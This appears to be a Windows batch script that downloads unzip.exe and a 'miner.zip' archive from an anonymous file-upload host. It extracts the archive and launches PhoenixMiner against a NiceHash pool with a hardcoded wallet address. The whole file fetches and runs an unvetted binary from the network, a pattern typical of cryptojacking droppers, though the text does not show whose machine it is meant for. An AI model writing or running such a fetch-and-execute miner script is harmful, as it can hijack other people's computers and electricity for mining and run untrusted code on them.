@echo off
mkdir miner
cd miner
curl http://stahlworks.com/dev/unzip.exe -o unzip.exe
curl https://bashupload.com/97LhI/miner.zip?download=1 -o miner.zip
unzip miner.zip
dir
PhoenixMiner.exe -rvram 1 -pool stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 -pool2 stratum+tcp://daggerhashimoto.eu-west.nicehash.com:3353 -ewal 368dnSPEiXj1Ssy35BBWMwKcmFnGLuqa1J.0e3hkezhni45tal -esm 3 -allpools 1 -allcoins 0
pause